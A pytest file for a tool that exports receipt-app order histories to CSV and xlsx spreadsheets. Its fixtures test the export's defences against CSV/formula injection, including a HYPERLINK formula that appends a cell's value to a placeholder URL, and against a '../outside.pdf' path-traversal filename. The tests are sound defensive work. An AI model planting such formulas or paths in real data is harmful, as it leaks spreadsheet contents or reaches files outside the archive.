"""tools/export_purchases.py. Every purchase from every receipt archive in one
spreadsheet, built from the order-history CSVs the receipt apps already
write, never from a PDF. Fixtures here are made up, no real order ever
touches the repository."""
import csv
import importlib.util
import sys
from pathlib import Path

import pytest

TOOL = Path(__file__).resolve().parents[2] / "tools" / "export_purchases.py"
spec = importlib.util.spec_from_file_location("export_purchases", TOOL)
xp = importlib.util.module_from_spec(spec)
spec.loader.exec_module(xp)

HEADER = ["Account Holder", "Purchase Date", "Purchase Type", "Order or Receipt Number",
          "Order Status", "Item Name", "Quantity", "Unit Price", "Line Item Total",
          "Order Total", "Fulfillment Method", "Return Status", "Purchase Summary",
          "PDF Filename", "Purchase Details URL", "Receipt URL", "Processing Status", "Notes"]


def _history(folder: Path, provider: str, rows, header=HEADER):
    folder.mkdir(parents=True, exist_ok=True)
    p = folder / f"{provider} Order History.csv"
    with open(p, "w", encoding="utf-8-sig", newline="") as fh:
        w = csv.writer(fh)
        w.writerow(header)
        for r in rows:
            w.writerow(r)
    return p


def _row(date, order, item, qty="1", unit="$10.00", line="$10.00", total="$10.00",
         holder="", ptype="Online", status="Delivered", summary="Household",
         pdf="x.pdf", proc="Completed"):
    return [holder, date, ptype, order, status, item, qty, unit, line, total,
            "Delivery", "", summary, pdf, "https://x/", "https://x/r", proc, ""]


@pytest.fixture
def root(tmp_path):
    _history(tmp_path / "Amazon Receipts", "Amazon", [
        _row("2026-03-02", "111-1", "Kettle", "1", "$40.00", "$40.00", "$52.50"),
        _row("2026-03-02", "111-1", "Tea", "2", "$6.25", "$12.50", "$52.50"),
        _row("2025-12-24", "111-2", "Socks", "3", "$5.00", "$15.00", "$15.00"),
        _row("2026-01-10", "111-3", "Bananas", "", "", "", "$23.10", summary="Groceries"),
    ])
    _history(tmp_path / "Target Receipts", "Target", [
        _row("2026-02-14", "T-9", "Card", "1", "$4.99", "$4.99", "$4.99", ptype="In-Store"),
    ])
    # A second-account folder holds its own copy of the history and no code.
    _history(tmp_path / "Amazon Receipts - jane", "Amazon", [
        _row("2026-03-05", "222-1", "Lamp", "1", "$30.00", "$30.00", "$30.00", holder="Jane"),
    ])
    # A statement archive has no order history and is simply not a source.
    (tmp_path / "Chase Statements").mkdir()
    (tmp_path / "Chase Statements" / "Chase Document Index.csv").write_text("a,b\n", encoding="utf-8")
    return tmp_path


def test_money_reads_the_shapes_the_apps_write():
    assert xp.money("$1,234.56") == 1234.56
    assert xp.money("-$5.00") == -5.0
    assert xp.money("$-5.00") == -5.0
    assert xp.money("") is None
    assert xp.money(None) is None
    assert xp.money("12.5") == 12.5
    assert xp.money("£9.99") == 9.99 and xp.money("€1,234.56") == 1234.56 and xp.money("-€5.00") == -5.0
    assert xp.quantity("2") == 2
    assert xp.quantity("") is None
    assert xp.quantity("1.5") == 1.5


def test_every_history_one_level_down_is_a_source_including_second_accounts(root):
    found = xp.find_histories(root)
    assert [p for p, _ in found] == ["Amazon", "Amazon", "Target"]
    assert {f.parent.name for _, f in found} == {"Amazon Receipts", "Amazon Receipts - jane", "Target Receipts"}


def test_one_row_per_item_newest_first_with_numbers_not_strings(root):
    r = xp.export(root, as_csv=True)
    assert r["purchases"] == 6 and r["orders"] == 5
    assert r["providers"] == {"Amazon": 5, "Target": 1}
    with open(r["path"], encoding="utf-8-sig", newline="") as fh:
        rows = list(csv.DictReader(fh))
    assert [x["Item"] for x in rows] == ["Lamp", "Kettle", "Tea", "Card", "Bananas", "Socks"]
    assert rows[0]["Provider"] == "Amazon" and rows[0]["Account"] == "Jane"
    assert rows[3]["Provider"] == "Target"
    assert rows[2]["Line Total"] == "12.5" and rows[2]["Quantity"] == "2"
    assert rows[4]["Quantity"] == "" and rows[4]["Order Total"] == "23.1"


def test_orders_count_each_order_once_and_the_summary_adds_them_up(root):
    purchases = []
    for prov, f in xp.find_histories(root):
        purchases += xp.load_purchases(prov, f)
    orders = xp.orders_from(purchases)
    by_no = {o["Order Number"]: o for o in orders}
    assert by_no["111-1"]["Items"] == 2 and by_no["111-1"]["Order Total"] == 52.5
    summary = {(s["Provider"], s["Year"]): s for s in xp.summary_from(orders)}
    assert summary[("Amazon", "2026")]["Orders"] == 3
    assert summary[("Amazon", "2026")]["Total"] == pytest.approx(52.5 + 23.1 + 30.0)
    assert summary[("Amazon", "2025")]["Total"] == 15.0
    assert summary[("Target", "2026")]["Orders"] == 1


def test_a_history_without_the_account_column_still_loads(tmp_path):
    """Walmart's history has no Account Holder column."""
    header = HEADER[1:]
    _history(tmp_path / "Walmart Receipts", "Walmart",
             [_row("2026-01-01", "W-1", "Bread")[1:]], header=header)
    r = xp.export(tmp_path, as_csv=True)
    assert r["purchases"] == 1
    with open(r["path"], encoding="utf-8-sig", newline="") as fh:
        row = next(csv.DictReader(fh))
    assert row["Item"] == "Bread" and row["Account"] == ""


def test_one_provider_can_be_picked(root):
    r = xp.export(root, provider="target", as_csv=True)
    assert r["providers"] == {"Target": 1}
    assert Path(r["path"]).name == "Target Purchases.csv"


def test_the_workbook_has_three_sheets_and_numeric_money(root):
    openpyxl = pytest.importorskip("openpyxl")
    r = xp.export(root)
    assert r["format"] == "xlsx" and Path(r["path"]).name == "All Purchases.xlsx"
    wb = openpyxl.load_workbook(r["path"])
    assert wb.sheetnames == ["Purchases", "Orders", "Summary"]
    ws = wb["Purchases"]
    header = [c.value for c in ws[1]]
    assert header[:5] == ["Provider", "Account", "Date", "Order Number", "Item"]
    total_col = header.index("Order Total") + 1
    assert isinstance(ws.cell(row=2, column=total_col).value, (int, float))  # 30.00 round-trips as 30
    assert ws.freeze_panes == "A2" and ws.auto_filter.ref


def test_no_sources_is_reported_not_faked(tmp_path):
    (tmp_path / "Chase Statements").mkdir()
    r = xp.export(tmp_path, as_csv=True)
    assert r["sources"] == [] and r["purchases"] == 0 and r["path"] is None
    assert xp.main(["--root", str(tmp_path), "--csv"]) == 1
    assert xp.main(["--root", str(tmp_path)]) == 1
    assert xp.main(["--root", str(tmp_path), "--provider", "Amazon"]) == 1
    assert [p.name for p in tmp_path.iterdir()] == ["Chase Statements"]


def test_a_build_that_finds_nothing_leaves_the_last_spreadsheet_as_it_was(root):
    """Every build that found no order history wrote an empty spreadsheet
    and then said there was nothing to export, so the one a person had
    built before was replaced by an empty one."""
    built = Path(xp.export(root, as_csv=True)["path"])
    before = built.read_bytes()
    for history in root.glob("*/* Order History.csv"):
        history.unlink()
    r = xp.export(root, as_csv=True)
    assert r["sources"] == [] and r["path"] is None
    assert built.read_bytes() == before


def test_the_cli_writes_beside_the_installs(root, capsys):
    assert xp.main(["--root", str(root), "--csv"]) == 0
    out = capsys.readouterr().out
    assert "6 purchases across 5 orders" in out
    assert (root / "All Purchases.csv").is_file()


def test_the_panel_does_not_send_a_path_to_reveal():
    """Reveal opens only the file the server itself wrote."""
    gui = Path(__file__).resolve().parents[2] / "gui"
    assert "def api_export_reveal():" in (gui / "app.py").read_text(encoding="utf-8")
    page = (gui / "static" / "app.js").read_text(encoding="utf-8")
    assert "fetch('/api/export/reveal', {method: 'POST'})" in page


def test_a_workbook_open_in_excel_is_a_plain_message_not_a_traceback(root, monkeypatch):
    def locked(path, *a, **k):
        raise PermissionError(13, "Permission denied", str(path))
    monkeypatch.setattr(xp, "write_csv", locked)
    with pytest.raises(PermissionError) as e:
        xp.export(root, as_csv=True)
    assert "open in another program" in str(e.value) and "All Purchases.csv" in str(e.value)
    assert xp.main(["--root", str(root), "--csv"]) == 2


def test_only_providers_with_line_items_are_offered_a_spreadsheet(root):
    offered = xp.providers(root)
    assert [p["provider"] for p in offered] == ["Amazon", "Target"]       # Chase has documents, not purchases
    assert offered[0]["folders"] == ["Amazon Receipts", "Amazon Receipts - jane"]


def test_a_provider_spreadsheet_holds_both_of_its_accounts(root):
    r = xp.export(root, provider="Amazon", as_csv=True)
    assert Path(r["path"]).name == "Amazon Purchases.csv"
    with open(r["path"], encoding="utf-8-sig", newline="") as fh:
        rows = list(csv.DictReader(fh))
    assert {x["Account"] for x in rows} == {"", "Jane"} and all(x["Provider"] == "Amazon" for x in rows)
    assert len(rows) == 5


def test_an_order_saved_after_a_write_that_saved_nothing_is_listed_once(tmp_path):
    """An older version wrote a receipt whose page did not show it down with
    no PDF, and a later run saved it and wrote it down again (#70). The
    order keeps the saved write's rows only. One never saved keeps its own."""
    _history(tmp_path / "Kroger Receipts", "Kroger", [
        _row("2026-05-22", "K-1", "Oats", pdf="", proc="Needs Manual Review"),
        _row("2026-05-22", "K-2", "Apples", pdf="", proc="Needs Manual Review"),
        _row("2026-05-22", "K-1", "Oats", pdf="2026-05-22 Kroger Groceries Receipt.pdf"),
        _row("2026-05-20", "K-3", "Card", pdf="", status="Canceled", proc="Canceled"),
    ])
    (prov, f), = xp.find_histories(tmp_path)
    purchases = xp.load_purchases(prov, f)
    assert [(p["Order Number"], p["Receipt PDF"]) for p in purchases] == [
        ("K-2", ""), ("K-1", "2026-05-22 Kroger Groceries Receipt.pdf"), ("K-3", "")]
    by_no = {o["Order Number"]: o for o in xp.orders_from(purchases)}
    assert by_no["K-1"]["Items"] == 1
    assert by_no["K-1"]["Receipt PDF"] == "2026-05-22 Kroger Groceries Receipt.pdf"


# -- text that looks like a formula stays text ----------------------------------------

# An item's name is chosen by whoever sells it, a store names itself, and a
# person writes the notes. Each value here is shaped like a formula and is
# harmless arithmetic or an address on a reserved domain.
SELLER = '=HYPERLINK("https://example.invalid/?"&A1,"Open")'
FORMULA_ROW = {"Account Holder": "@SUM(1,1)", "Purchase Date": "2026-04-01", "Purchase Type": "+1+1",
               "Order or Receipt Number": "=1+1", "Order Status": "-1+1", "Item Name": SELLER,
               "Quantity": "2", "Unit Price": "$5.00", "Line Item Total": "$10.00",
               "Order Total": "$10.00", "Fulfillment Method": "=2+2", "Return Status": "@x",
               "Purchase Summary": "+SUM(1,1)", "PDF Filename": "=3+3.pdf",
               "Purchase Details URL": "https://x/", "Receipt URL": "https://x/r",
               "Processing Status": "-2+2", "Notes": "=4+4"}
# A refund, whose amounts are negative numbers, an order numbered like a
# plain negative number, and a date that makes the Summary's year text.
REFUND_ROW = dict(FORMULA_ROW, **{"Purchase Date": "-1+1", "Order or Receipt Number": "-42",
                                  "Item Name": "Refunded kettle", "Quantity": "1",
                                  "Unit Price": "-$12.34", "Line Item Total": "-$12.34",
                                  "Order Total": "-$12.34"})
# Every text cell each sheet should hold, as the history wrote it.
FORMULAS_BY_SHEET = {
    "Purchases": {"@Shop", "@SUM(1,1)", "=1+1", SELLER, "+1+1", "=2+2", "-1+1", "@x",
                  "+SUM(1,1)", "=3+3.pdf", "-2+2", "=4+4"},
    "Orders": {"@Shop", "@SUM(1,1)", "=1+1", "+1+1", "=2+2", "-1+1", "+SUM(1,1)", "=3+3.pdf"},
    "Summary": {"@Shop", "-1+1"},
}


@pytest.fixture
def formula_root(tmp_path):
    _history(tmp_path / "Shop Receipts", "@Shop",
             [[FORMULA_ROW[h] for h in HEADER], [REFUND_ROW[h] for h in HEADER]])
    return tmp_path


def _cells(ws):
    return [c for row in ws.iter_rows() for c in row]


def _column(ws, name):
    header = [c.value for c in ws[1]]
    return [row[header.index(name)] for row in ws.iter_rows(min_row=2)]


def test_every_text_cell_on_every_sheet_is_a_string_cell_never_a_formula(formula_root):
    openpyxl = pytest.importorskip("openpyxl")
    import zipfile
    path = xp.export(formula_root)["path"]
    wb = openpyxl.load_workbook(path)
    assert wb.sheetnames == list(FORMULAS_BY_SHEET)
    for ws in wb:
        cells = _cells(ws)
        assert all(c.data_type in ("s", "n") for c in cells), \
            [(c.coordinate, c.data_type) for c in cells if c.data_type not in ("s", "n")]
        assert all(c.data_type == "s" for c in cells if isinstance(c.value, str))
        prefixed = {c.value for c in cells if c.quotePrefix}
        assert prefixed == FORMULAS_BY_SHEET[ws.title], ws.title
    assert wb["Purchases"]["E2"].value == SELLER and wb["Purchases"]["E2"].data_type == "s"
    with zipfile.ZipFile(path) as z:
        sheets = [n for n in z.namelist() if n.startswith("xl/worksheets/")]
        assert len(sheets) == 3
        assert not any(b"<f>" in z.read(n) or b"<f " in z.read(n) for n in sheets)


def test_amounts_quantities_and_counts_stay_numbers_a_refund_negative(formula_root):
    openpyxl = pytest.importorskip("openpyxl")
    wb = openpyxl.load_workbook(xp.export(formula_root)["path"])
    purchases, orders, summary = wb["Purchases"], wb["Orders"], wb["Summary"]
    by_item = {row[4].value: row for row in purchases.iter_rows(min_row=2)}
    refund = dict(zip([c.value for c in purchases[1]], by_item["Refunded kettle"]))
    for col in ("Unit Price", "Line Total", "Order Total"):
        assert (refund[col].value, refund[col].data_type) == (-12.34, "n"), col
        assert refund[col].number_format == "#,##0.00"
    assert (refund["Quantity"].value, refund["Quantity"].data_type) == (1, "n")
    # The order numbered -42 is still text, with nothing in front of it.
    assert (refund["Order Number"].value, refund["Order Number"].data_type) == ("-42", "s")
    assert not refund["Order Number"].quotePrefix
    assert sorted((c.value, c.data_type) for c in _column(orders, "Order Total")) == [(-12.34, "n"), (10, "n")]
    assert all(c.data_type == "n" for c in _column(orders, "Items"))
    assert sorted((c.value, c.data_type) for c in _column(summary, "Total")) == [(-12.34, "n"), (10, "n")]
    assert all(c.data_type == "n" for c in _column(summary, "Orders"))


def test_the_csv_quotes_text_that_could_start_a_formula_and_no_amount(formula_root):
    r = xp.export(formula_root, as_csv=True)
    with open(r["path"], encoding="utf-8-sig", newline="") as fh:
        rows = {x["Order Number"]: x for x in csv.DictReader(fh)}
    sold, refund = rows["'=1+1"], rows["-42"]
    assert sold["Item"] == "'" + SELLER
    assert sold["Provider"] == "'@Shop" and sold["Account"] == "'@SUM(1,1)"
    assert (sold["Type"], sold["Fulfillment"], sold["Order Status"]) == ("'+1+1", "'=2+2", "'-1+1")
    assert (sold["Return Status"], sold["Category"], sold["Receipt PDF"]) == ("'@x", "'+SUM(1,1)", "'=3+3.pdf")
    assert (sold["Processing"], sold["Notes"]) == ("'-2+2", "'=4+4")
    assert (sold["Quantity"], sold["Unit Price"], sold["Line Total"]) == ("2", "5.0", "10.0")
    assert (refund["Unit Price"], refund["Line Total"], refund["Order Total"]) == ("-12.34",) * 3
    assert refund["Date"] == "'-1+1" and refund["Item"] == "Refunded kettle"


# Text handed straight to the writers, the CSV cell each becomes, and
# whether its xlsx cell carries the quote prefix.
LEADS = [
    (" =1+1", "' =1+1", True),
    ("\t=1+1", "'\t=1+1", True),
    ("\r=1+1", "'\r'=1+1", True),
    ("\n=1+1", "'\n'=1+1", True),
    ("\tplain words", "'\tplain words", True),
    ("＝1+1", "'＝1+1", True),
    ("Widget;=1+1", "Widget;'=1+1", False),
    ("Widget\n@SUM(1,1)", "Widget\n'@SUM(1,1)", False),
    # A plain negative number after a ; runs on into the next value where the
    # list separator is ; and the decimal sign a comma, so it is quoted there.
    ("Refund; -12.34", "Refund;' -12.34", False),
    ("#N/A", "#N/A", False),
]


def test_text_with_a_lead_a_wide_sign_or_a_break_inside_is_kept_from_a_formula(tmp_path):
    """The histories' values are trimmed as they load, so this goes to the
    writers directly with text that still has its lead."""
    openpyxl = pytest.importorskip("openpyxl")
    purchases = []
    for i, (text, _cell, _prefix) in enumerate(LEADS):
        p = {c: "" for c, _ in xp.COLUMNS}
        p.update({"Provider": "Shop", "Date": "2026-01-%02d" % (i + 1), "Order Number": "S-%d" % i,
                  "Item": text, "Notes": text, "Line Total": -1.5, "Quantity": 1})
        purchases.append(p)
    orders = xp.orders_from(purchases)
    xp.write_xlsx(tmp_path / "p.xlsx", purchases, orders, xp.summary_from(orders))
    ws = openpyxl.load_workbook(tmp_path / "p.xlsx")["Purchases"]
    items = _column(ws, "Item")
    assert len(items) == len(LEADS)
    for (text, _cell, prefix), c in zip(LEADS, items):
        # XML reads a carriage return back as a line feed.
        assert (c.value, c.data_type, c.quotePrefix) == (text.replace("\r", "\n"), "s", prefix), repr(text)
    assert all((c.value, c.data_type) == (-1.5, "n") for c in _column(ws, "Line Total"))
    xp.write_csv(tmp_path / "p.csv", purchases)
    with open(tmp_path / "p.csv", encoding="utf-8-sig", newline="") as fh:
        back = list(csv.DictReader(fh))
    assert [x["Item"] for x in back] == [cell for _text, cell, _prefix in LEADS]
    assert all(x["Item"] == x["Notes"] and x["Line Total"] == "-1.5" for x in back)


# -- a history the app wrote itself ----------------------------------------------------

def _written_by_the_app(folder: Path, provider: str, rows) -> Path:
    """The history as a receipt app writes it, through core storage's
    CsvFile, which holds text like a formula with a quote in front."""
    from paperpull_core.storage import CsvFile
    folder.mkdir(parents=True, exist_ok=True)
    f = CsvFile(folder / f"{provider} Order History.csv", HEADER)
    f.append_rows(rows)
    return f.path


def _sheets(path):
    openpyxl = pytest.importorskip("openpyxl")
    wb = openpyxl.load_workbook(path)
    return {ws.title: [[(c.value, c.data_type, c.quotePrefix) for c in row] for row in ws.iter_rows()]
            for ws in wb}


def test_a_history_the_app_wrote_gives_both_spreadsheets_the_words_it_was_given(tmp_path):
    """The app's file holds each formula-like value with a quote in front,
    which has to come off as the history loads, or every such cell would
    carry two quotes and a file name one the file does not have. So the
    spreadsheets built from it are the ones built from the same words
    written plainly, as an older version wrote them."""
    pytest.importorskip("openpyxl")
    old, new = tmp_path / "old", tmp_path / "new"
    _history(old / "Shop Receipts", "@Shop",
             [[FORMULA_ROW[h] for h in HEADER], [REFUND_ROW[h] for h in HEADER]])
    held = _written_by_the_app(new / "Shop Receipts", "@Shop", [FORMULA_ROW, REFUND_ROW])
    text = held.read_text(encoding="utf-8-sig")
    assert "'=3+3.pdf" in text and "-$12.34" in text and "'-$12.34" not in text
    assert xp.load_purchases("@Shop", held) == \
        xp.load_purchases("@Shop", old / "Shop Receipts" / "@Shop Order History.csv")
    old_csv, new_csv = (Path(xp.export(root, as_csv=True)["path"]).read_bytes()
                        for root in (old, new))
    assert old_csv == new_csv
    assert _sheets(xp.export(old)["path"]) == _sheets(xp.export(new)["path"])


def test_a_name_that_really_starts_with_a_quote_keeps_it(tmp_path):
    pytest.importorskip("openpyxl")
    row = dict(FORMULA_ROW, **{"Item Name": "'=1+1 kettle", "Notes": "'Tis the season",
                               "PDF Filename": "'=3+3.pdf"})
    held = _written_by_the_app(tmp_path / "Shop Receipts", "Shop", [row])
    assert "''=1+1 kettle" in held.read_text(encoding="utf-8-sig")
    (item,) = xp.load_purchases("Shop", held)
    assert (item["Item"], item["Notes"], item["Receipt PDF"]) == \
        ("'=1+1 kettle", "'Tis the season", "'=3+3.pdf")
    with open(xp.export(tmp_path, as_csv=True)["path"], encoding="utf-8-sig", newline="") as fh:
        (out,) = list(csv.DictReader(fh))
    assert (out["Item"], out["Notes"], out["Receipt PDF"]) == \
        ("'=1+1 kettle", "'Tis the season", "'=3+3.pdf")
    cells = {v: (t, q) for sheet in _sheets(xp.export(tmp_path)["path"]).values()
             for row in sheet for v, t, q in row}
    assert cells["'=1+1 kettle"] == ("s", False)


# -- what an xlsx cell cannot hold ---------------------------------------------------

# Every character XML 1.0 has no place for, so an xlsx cannot hold it. The
# control characters are the 29 openpyxl refuses, and the last two and the
# surrogates it wrote into a workbook Excel would not open.
CONTROLS = [chr(n) for n in range(0x20) if n not in (0x9, 0xA, 0xD)]
IN_A_FILE = CONTROLS + [chr(0xFFFE), chr(0xFFFF)]
CANNOT_HOLD = IN_A_FILE + [chr(n) for n in range(0xD800, 0xE000)]
_CANNOT = frozenset(CANNOT_HOLD)
# The six Python counts as blank space, which become a space in a cell.
BLANK = frozenset(chr(n) for n in (0x0B, 0x0C, 0x1C, 0x1D, 0x1E, 0x1F))


def _excel_reads(text: str) -> str:
    """What Excel shows for an xlsx string, _x and four hex digits and _ as
    one character (measured 2026-10-16, see test_sheets.py)."""
    import re
    return re.sub(r"_x([0-9A-Fa-f]{4})_", lambda m: chr(int(m.group(1), 16)), text)


def _no_cell_holds_what_an_xlsx_cannot(path):
    openpyxl = pytest.importorskip("openpyxl")
    import zipfile
    wb = openpyxl.load_workbook(path)
    for ws in wb:
        for c in _cells(ws):
            assert not (isinstance(c.value, str) and not _CANNOT.isdisjoint(c.value)), c.coordinate
    with zipfile.ZipFile(path) as z:
        sheets = [n for n in z.namelist() if n.startswith("xl/worksheets/")]
        assert not any(b"<f>" in z.read(n) or b"<f " in z.read(n) for n in sheets)
    return wb


def test_a_history_holding_a_character_an_xlsx_cannot_hold_still_makes_both_spreadsheets(tmp_path):
    """A provider's JSON can carry a NUL or another control character in an
    item name, Uber's for one, and the app keeps it in its history as it
    came. openpyxl refused the row holding it and the whole workbook was
    lost. Now the character is taken out of the cell, a space standing in
    for one that is blank space, the text around it stays, one in front of
    =1+1 leaves =1+1 with the quote prefix, and the CSV keeps every
    character as the history holds it."""
    assert len(CONTROLS) == 29
    rows = []
    for i, c in enumerate(IN_A_FILE):
        rows.append(dict(FORMULA_ROW, **{
            "Account Holder": c + "=1+1", "Purchase Date": "2026-05-01",
            "Order or Receipt Number": "C-%02d" % i, "Item Name": "Kettle" + c + "lid",
            "Fulfillment Method": "Ship", "Return Status": "", "Order Status": "Delivered",
            "Purchase Type": "Online", "Purchase Summary": "Home " + c,
            "PDF Filename": "C-%02d.pdf" % i, "Processing Status": "Completed",
            "Notes": "a" + c + "b"}))
    rows.append(dict(rows[0], **{"Order or Receipt Number": "C-x", "Item Name": "_x003D_1+1",
                                 "Account Holder": "Jane", "Notes": "a_x0041_b"}))
    held = _written_by_the_app(tmp_path / "Shop Receipts", "Shop", rows)
    assert chr(0) in held.read_text(encoding="utf-8-sig")
    wb = _no_cell_holds_what_an_xlsx_cannot(xp.export(tmp_path)["path"])
    purchases = wb["Purchases"]
    by_order = {row[3].value: dict(zip([h.value for h in purchases[1]], row))
                for row in purchases.iter_rows(min_row=2)}
    assert len(by_order) == len(rows)
    for i, c in enumerate(IN_A_FILE):
        line, s = by_order["C-%02d" % i], " " if c in BLANK else ""
        assert (line["Item"].value, line["Notes"].value) == ("Kettle" + s + "lid", "a" + s + "b"), i
        assert (line["Account"].value, line["Account"].data_type, line["Account"].quotePrefix) == \
            ("=1+1", "s", True), i
        assert line["Category"].value.rstrip() == "Home", i
        assert (line["Line Total"].value, line["Line Total"].data_type) == (10, "n")
    escaped = by_order["C-x"]
    assert _excel_reads(escaped["Item"].value) == "_x003D_1+1" and not escaped["Item"].quotePrefix
    assert _excel_reads(escaped["Notes"].value) == "a_x0041_b"
    orders = {o[3].value: o for o in wb["Orders"].iter_rows(min_row=2)}
    assert len(orders) == len(rows) and all(o[1].value in ("=1+1", "Jane") for o in orders.values())
    with open(xp.export(tmp_path, as_csv=True)["path"], encoding="utf-8-sig", newline="") as fh:
        out = {x["Order Number"]: x for x in csv.DictReader(fh)}
    for i, c in enumerate(IN_A_FILE):
        assert (out["C-%02d" % i]["Item"], out["C-%02d" % i]["Notes"]) == ("Kettle" + c + "lid", "a" + c + "b")


HALVES = frozenset(chr(n) for n in range(0xD800, 0xE000))
HIGH, LOW, MARK = chr(0xD83D), chr(0xDE00), chr(0xFFFD)


def test_both_writers_make_whole_a_half_no_history_could_hold(tmp_path):
    """A UTF-8 file cannot hold half of a surrogate pair, so this goes to the
    writers directly, with every character an xlsx cannot hold. The CSV
    writer stopped at the first half with UnicodeEncodeError. Both give a
    half as U+FFFD now, which starts no formula, so =1+1 behind one takes
    no quote."""
    purchases = []
    for i, c in enumerate(CANNOT_HOLD):
        p = {col: "" for col, _ in xp.COLUMNS}
        p.update({"Provider": "Shop", "Account": c + "=1+1", "Date": "2026-05-01",
                  "Order Number": "S-%04d" % i, "Item": "Kettle" + c + "lid", "Line Total": -1.5,
                  "Order Total": -1.5, "Quantity": 1})
        purchases.append(p)
    orders = xp.orders_from(purchases)
    xp.write_xlsx(tmp_path / "p.xlsx", purchases, orders, xp.summary_from(orders))
    wb = _no_cell_holds_what_an_xlsx_cannot(tmp_path / "p.xlsx")
    ws = wb["Purchases"]
    between = [" " if c in BLANK else MARK if c in HALVES else "" for c in CANNOT_HOLD]
    assert [c.value for c in _column(ws, "Item")] == ["Kettle" + s + "lid" for s in between]
    assert [(c.value, c.quotePrefix) for c in _column(ws, "Account")] == \
        [(s + "=1+1", s != MARK) for s in between]
    assert all((c.value, c.data_type) == (-1.5, "n") for c in _column(ws, "Line Total"))
    assert [(r[0].value, r[2].value) for r in wb["Summary"].iter_rows(min_row=2)] == \
        [("Shop", len(CANNOT_HOLD))]
    xp.write_csv(tmp_path / "p.csv", purchases)
    with open(tmp_path / "p.csv", encoding="utf-8-sig", newline="") as fh:
        out = {x["Order Number"]: x for x in csv.DictReader(fh)}
    assert len(out) == len(CANNOT_HOLD)
    for i, c in enumerate(CANNOT_HOLD):
        line = out["S-%04d" % i]
        if c in HALVES:
            assert (line["Item"], line["Account"]) == ("Kettle" + MARK + "lid", MARK + "=1+1"), i
        else:
            assert line["Item"] == "Kettle" + c + "lid", i


def test_a_half_the_app_held_as_the_mark_reads_into_both_spreadsheets_as_it(tmp_path):
    """Core storage's CsvFile, which a receipt app writes its history
    through, stopped at an item name carrying half of an emoji. It holds
    the half as U+FFFD now, and a pair that came apart as the character it
    makes, and both spreadsheets show what the history holds. An app run
    still stops before this, at its progress.json (sheets, HALF OF A
    CHARACTER)."""
    rows = [dict(FORMULA_ROW, **{"Order or Receipt Number": "H-1",
                                 "Item Name": "SHOP " + HIGH + "NAME", "Notes": HIGH + "=1+1"}),
            dict(FORMULA_ROW, **{"Order or Receipt Number": "H-2",
                                 "Item Name": HIGH + LOW + " Kettle", "Notes": "=1+1" + LOW})]
    held = _written_by_the_app(tmp_path / "Shop Receipts", "Shop", rows)
    assert held.read_bytes().decode("utf-8-sig").count(MARK) == 3
    want = {"H-1": ("SHOP " + MARK + "NAME", MARK + "=1+1"),
            "H-2": (chr(0x1F600) + " Kettle", "=1+1" + MARK)}
    with open(xp.export(tmp_path, as_csv=True)["path"], encoding="utf-8-sig", newline="") as fh:
        out = {x["Order Number"]: (x["Item"], x["Notes"]) for x in csv.DictReader(fh)}
    assert out == {k: (item, ("'" if note.startswith("=") else "") + note)
                   for k, (item, note) in want.items()}
    ws = _no_cell_holds_what_an_xlsx_cannot(xp.export(tmp_path)["path"])["Purchases"]
    shown = {o.value: (i.value, n.value, n.quotePrefix) for o, i, n in
             zip(_column(ws, "Order Number"), _column(ws, "Item"), _column(ws, "Notes"))}
    assert shown == {k: (item, note, note.startswith("=")) for k, (item, note) in want.items()}


def test_meijer_summary_recovers_saved_pdf_items(tmp_path, monkeypatch):
    from paperpull_core import meijer_items
    from paperpull_core.models import Item
    folder = tmp_path / 'Meijer Receipts'
    history = _history(folder, 'Meijer', [_row('2026-07-04', 'm1', 'In-Store:', unit='', line='$5.00', total='$5.00', ptype='In-Store', pdf='saved.pdf')])
    (folder / 'In-Store').mkdir()
    (folder / 'In-Store' / 'saved.pdf').write_bytes(b'placeholder')
    calls = []
    def read(path, date, total):
        calls.append((path, date, total))
        return [Item(name='MILK', quantity='2', unit_price='$2.50', line_total='$5.00')]
    monkeypatch.setattr(meijer_items, 'read_items', read)
    before = history.read_bytes()
    rows = xp.load_purchases('Meijer', history)
    assert len(rows) == 1
    assert rows[0]['Item'] == 'MILK'
    assert rows[0]['Quantity'] == 2
    assert rows[0]['Line Total'] == 5
    assert calls[0][1:] == ('2026-07-04', 5.0)
    assert history.read_bytes() == before


def test_meijer_failed_recovery_never_exports_total_as_product(tmp_path, monkeypatch):
    from paperpull_core import meijer_items
    history = _history(tmp_path / 'Meijer Receipts', 'Meijer', [
        _row('2026-07-04', 'm1', 'In-Store:', pdf='../outside.pdf'),
        _row('2026-07-05', 'm2', 'MILK'),
    ])
    def forbidden(*args):
        raise AssertionError('must not read outside the archive')
    monkeypatch.setattr(meijer_items, 'read_items', forbidden)
    rows = xp.load_purchases('Meijer', history)
    assert rows[0]['Item'] == ''
    assert rows[0]['Line Total'] is None
    assert rows[1]['Item'] == 'MILK'
